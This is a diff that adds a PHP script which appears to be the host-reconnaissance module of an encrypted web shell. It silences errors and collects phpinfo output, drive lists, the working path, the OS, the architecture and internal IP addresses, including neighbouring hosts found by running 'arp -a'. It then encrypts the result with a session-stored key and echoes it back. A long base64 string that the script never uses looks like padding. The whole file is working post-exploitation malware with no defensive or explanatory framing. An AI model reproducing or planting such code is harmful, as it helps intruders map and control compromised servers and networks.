@@ -1,0 +1,91 @@
+error_reporting(0);
+function main($whatever) {
+    $result = array();
+    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
+    $driveList ="";
+    if (stristr(PHP_OS,"windows")||stristr(PHP_OS,"winnt"))
+    {
+        for($i=65;$i<=90;$i++)
+    	{
+    		$drive=chr($i).':/';
+    		file_exists($drive) ? $driveList=$driveList.$drive.";":'';
+    	}
+    }
+	else
+	{
+		$driveList="/";
+	}
+    $currentPath=getcwd();
+    //echo "phpinfo=".$info."\n"."currentPath=".$currentPath."\n"."driveList=".$driveList;
+    $osInfo=PHP_OS;
+    $arch="64";
+    if (PHP_INT_SIZE == 4) {
+        $arch = "32";
+    }
+    $localIp=gethostbyname(gethostname());
+    if ($localIp!=$_SERVER['SERVER_ADDR'])
+    {
+        $localIp=$localIp." ".$_SERVER['SERVER_ADDR'];
+    }
+    $extraIps=getInnerIP();
+    foreach($extraIps as $ip)
+    {
+        if (strpos($localIp,$ip)===false)
+        {
+         $localIp=$localIp." ".$ip;
+        }
+    }
+    $basicInfoObj=array("basicInfo"=>base64_encode($info),"driveList"=>base64_encode($driveList),"currentPath"=>base64_encode($currentPath),"osInfo"=>base64_encode($osInfo),"arch"=>base64_encode($arch),"localIp"=>base64_encode($localIp));
+    //echo json_encode($result);
+    $result["status"] = base64_encode("success");
+    $result["msg"] = base64_encode(json_encode($basicInfoObj));
+    //echo json_encode($result);
+    //echo openssl_encrypt(json_encode($result), "AES128", $key);
+    echo encrypt(json_encode($result));
+}
+function getInnerIP()
+{
+$result = array();
+
+if (is_callable("exec"))
+{
+    $result = array();
+    exec('arp -a',$sa);
+    foreach($sa as $s)
+    {
+        if (strpos($s,'---')!==false)
+		{
+			$parts=explode(' ',$s);
+			$ip=$parts[1];
+			array_push($result,$ip);
+		}
+		//var_dump(explode(' ',$s));
+           // array_push($result,explode(' ',$s)[1]);
+    }
+
+}
+
+return $result;
+}
+
+
+
+
+function Encrypt($data)
+{
+ @session_start();
+    $key = $_SESSION['k'];
+	if(!extension_loaded('openssl'))
+    	{
+    		for($i=0;$i<strlen($data);$i++) {
+    			 $data[$i] = $data[$i]^$key[$i+1&15];
+    			}
+			return $data;
+    	}
+    else
+    	{
+    		return openssl_encrypt($data, "AES128", $key);
+    	}
+}
+$whatever="Sjl5S0Zza0YydTgyTGV1Nmk3MkpTdXBuN3ptZVFxV1F5Z3JYdEJkSUM1Uzl4NHBCMk05eTNtbFV3ekxPSldubk5Bd0MzODNmdWExWWZ2ZG5RNkhGSm1VaGVUTVhrcjZjVWhKRWRqYVNjNVFrcVdXd3d3dGxGcVl6RklyRm1FWDB6UG5UUXM1NnFiRmVrMjdDUGVaYllQYTh2UWU2VmRQdEFucTZFZTRyUVBPZU1OUmFjYUx6TDVZOGNTTUMzNlI5MnpKb2lKTlAwQlFiUWhVWjdsVTg5Z3lxNlZ5YXdCN1UySVh0UzF6dmE3ZWt6NUdOTzliUGRVazRCZVNkMkFrb1NYazZWdzE4bzZoYlhBZU4xREk2c1hNRXZjVU9DQ2M5ZjY2RFR6TnpjWVY3UlFpYTVUc3c2a2M5V280SHU5YmQ4eTRqNm1MSUdRZUpZbWN4RXZ3SE5OUXRhU2E5YURDOTF4ZnRQcUk2ZTE5TFh1SktoNVNFQVpGeVVIbzNQd1JhckhqSnFVaXlKRk5VeEQ4bm1FV2NSZFlnSnN4eTF3SHJLM0g5N3AzcTNuUTlIMzFrU3MzOHZhNFFWM3BnUkU4WEtZdDFaaWtleHVaMzBIV3lGb29oeW1lWWpRckZkazhvNVFrVlRQV0VqRlRpVm11R3BOaGZERXh3SnllN3dtU3N2UkhIM0hOUU9adUU5ODBEZ2NuOVFvWDE5UkV0TTRUOWJOd0lYcWZmY2pVSmhSaHZPMVZkTUR4QlVFRVJNa1ZUSE9WMlM2bE5HcHF1NjhjN2Z4MVdFNkZHa1dFN0xEbWU0UXJKRVhacmQyZHBta01RQkc3bEo3YnI4eUl1dTN2d3ZHaGtWc043RFVoZW9UcGtVWTI0VTU4eVlhZWJrbEk2ZThiZzRYVzl1RlVJUzBWbk9CUDJ1ajgxNkhzU1lJSXVXUm1wZDNQVzJOcE14aUxCYm5HaThyU2x1dHM0bGJ6Z3RYSFFQekE2N2ZySGRaNm1OVlhsM3plbzRPWUNDZGRIVG1rcVZZajNsand4QjZYejVEYkhjQkNZZ1lHMTRVVDkyZXZJc0xsWk03ZE5rV1R3bmFaSDJiaDZKTXVNQVBpZ2xIRlFpMms2OXB0azVaRE9JbGxZNkU4SXJZMUQ5V2NaMDFWckVXVm5ETEFvRU50Zm1Md01VT1hpWGE3WDNGYjZPM0RNUU5ORjQ4bFc5Y0RIWVdsMmR0eVJWRlZHUEZNWlVDd0x4djNnQmVVMXBVT2RjTmlGOTE2TzNJcUhuTXZCaVdMbkNWc0kxTUpHNTZ6RmowUVhQSHhvV3gwVG0xc0t4dElKNU5mZnd2Y0RodUkzVUp0eFpUNkNzOXA4MGYwS1lVekVTVUZsTkdud05tempOU2hJTWJYM21KbXBZaHc0N0ZINE1yaFowQ0M2WWFvbmFVNDIzaE1pNXhXSjFBR3dJdEh4MXpJUlA5V1hWNEFncm5HWWpKSUlIUEQ3dWFJRUp2dldWSmlCaWF5M3hSNDNVSUJ0eVBjaHZoMnZzcTFqbXIzNkZ2eU03QTJJU2RtWUpWY2d1UFlKZVJZd1EyUnhMb0dHRmdGR2s4R1FuVzJCU29nWEVFNkNhVk5scnlxUUVxeFo2OHlzRFZBZGdBeE1zUXA0bFVqTTlvRndzd2FvWTVCMXNaVmtjMkFaV3JLWkUzUExUN2RHTlpmQTZXNTc0eENsTXZpSVJibXpEdU5qRTBBRlVFejNrNG1PV2p2ZW9TQ3M0c0psVTFid0FUb0xKSnE4NUozQzk1T1MzZldRZHZ1SXBYZ1NwelBOZ2tGY2J2aktSUHhkNXhzbDZl";$whatever=base64_decode($whatever);
+main($whatever);
